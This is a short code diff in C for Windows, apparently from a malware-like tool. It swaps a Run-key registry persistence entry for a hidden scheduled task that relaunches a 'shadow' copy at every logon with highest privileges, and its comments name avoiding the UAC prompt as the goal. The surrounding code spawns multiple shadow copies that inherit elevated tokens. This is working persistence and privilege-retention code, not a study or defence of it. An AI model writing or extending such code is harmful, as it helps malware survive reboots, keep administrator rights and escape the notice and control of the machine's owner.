@@ -373,6 +373,24 @@ int sys_is_admin(void) {
     return IsUserAnAdmin() ? 1 : 0;
 }
 
+/* Create a scheduled task for the shadow so it runs at logon with highest privileges (no UAC). */
+static void schedule_shadow_task(const char *name, const char *path) {
+    char cmdLine[2048];
+    snprintf(cmdLine, sizeof(cmdLine),
+        "schtasks.exe /create /f /tn \"%s\" /tr \"\\\"%s\\\" --shadow\" /sc onlogon /rl HIGHEST",
+        name, path);
+
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+
+    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
 /* Spawn a single shadow copy with a given filename and registry key name.
    Uses CreateProcess for elevation inheritance. */
 static void spawn_single_copy(const char *filename, const char *regKey) {
@@ -396,16 +414,8 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
         return;
     }
 
-    /* Register persistence */
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        char runCmd[MAX_PATH * 2];
-        snprintf(runCmd, sizeof(runCmd), "\"%s\" --shadow", destPath);
-        RegSetValueExA(hKey, regKey, 0, REG_SZ, (BYTE*)runCmd, (DWORD)strlen(runCmd) + 1);
-        RegCloseKey(hKey);
-    }
+    /* Register persistence via scheduled task: runs at logon with highest privileges, no UAC prompt */
+    schedule_shadow_task(regKey, destPath);
 
     /* CreateProcess inherits parent's elevated token */
     STARTUPINFOA si = {0};
